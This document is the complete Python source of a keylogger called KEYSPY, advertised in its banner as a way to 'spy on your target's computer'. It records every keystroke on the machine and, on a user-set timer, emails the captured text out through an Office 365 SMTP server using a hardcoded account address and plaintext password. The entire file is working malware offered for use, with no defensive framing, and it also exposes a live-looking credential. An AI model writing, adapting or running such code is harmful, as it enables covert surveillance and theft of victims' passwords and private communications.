import smtplib
import os
import keyboard
from threading import Timer
from datetime import datetime
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
import colorama
colorama.init()
g = colorama.Fore.GREEN
y = colorama.Fore.YELLOW
b = colorama.Fore.LIGHTBLUE_EX
re = colorama.Fore.LIGHTRED_EX
r = colorama.Fore.RESET

os.system("clear")
print(f"""{g}

██╗░░██╗███████╗██╗░░░██╗░██████╗██████╗░██╗░░░██╗
██║░██╔╝██╔════╝╚██╗░██╔╝██╔════╝██╔══██╗╚██╗░██╔╝
█████═╝░█████╗░░░╚████╔╝░╚█████╗░██████╔╝░╚████╔╝░
██╔═██╗░██╔══╝░░░░╚██╔╝░░░╚═══██╗██╔═══╝░░░╚██╔╝░░{y}
██║░╚██╗███████╗░░░██║░░░██████╔╝██║░░░░░░░░██║░░░
╚═╝░░╚═╝╚══════╝░░░╚═╝░░░╚═════╝░╚═╝░░░░░░░░╚═╝░░░
""")
print(f"{re}                  Spy on your target's computer     \n ")
print(f"{g}********" * 8)
print(f"""{y} [+] PROGRAM NAME: KEYSPY
\n
 [+] CREATED BY SOLOMON ADENUGA
\n
 [+] GITHUB : SoloTech01
\n
 [+] VERSION: 1.0
\n
""")
print(f"{g}********" * 8 + "\n")
reports_interval = int(input(f"{g}ENTER REPORTS INTERVAL(IN SECONDS):{y} "))
email_address = "mattrexxie1@outlook.com"
password = "vmtrupe4#3"
user_email = input(f"\n{g}ENTER YOUR EMAIL ADDRESS: {y}")
print(r)
class Keylogger:
	def __init__(self, interval):
		self.interval = interval
		
		self.log = ""
		
		self.start_dt = datetime.now()
		self.end_dt = datetime.now()
		
	def callback(self, event):
		
		name = event.name
		if len(name) > 1:
			
			if name == "space":
				name = " "
				
			elif name == "enter":
				name = "[ENTER]\n"
			
			elif name == "decimal":
				name = " . "
				
			else:
				name = name.replace(" ", "_")
				name = f"[{name.upper()}]"
				
		self.log += name
		
	def update_filename(self):
		start_dt_str = str(self.start_dt)[:7].replace(" ", "_").replace(":", "")
		end_dt_str = str(self.end_dt)[:7].replace(" ", "_").replace(":", "")
		self.filename = f"keylog-{start_dt_str}_{end_dt_str}"
		
	def prepare_mail(self, message):
		msg = MIMEMultipart("alternative")
		msg["From"] = email_address
		msg["To"] = user_email
		msg["Subject"] = "Keylogger logs"
		
		html =f"<p>{message}</p>"
		text_part = MIMEText(message, "plain")
		html_part = MIMEText(html, "html")
		msg.attach(text_part)
		msg.attach(html_part)
		
		return msg.as_string()
		
	def sendmail(self, email, password, message, verbose= 1):
		server = smtplib.SMTP(host= "smtp.office365.com", port= 587)
		server.starttls()
		server.login(email, password)
		print(f"{g}SENDING MESSAGE......{r}")
		server.sendmail(email, email, self.prepare_mail(message))
		server.quit()
		if verbose:
			print(f"{g}[✓]{datetime.now()} -Sent an email to {user_email} containing {message}{r}")
			
	def report(self):
		if self.log:
			self.end_dt = datetime.now()
			self.update_filename()
			self.sendmail(email_address, password, self.log)
		self.log = ""
		timer = Timer(interval= self.interval, function = self.report)
		timer.daemon = True
		timer.start()
		
	def start(self):
		self.start_dt = datetime.now()
		keyboard.on_release(callback= self.callback)
		self.report()
		print(f"{g}[+]{datetime.now()} -Started Keylogger{r}")
		keyboard.wait()
		
if __name__ == "__main__":
	keylogger= Keylogger(interval= reports_interval)
	keylogger.start()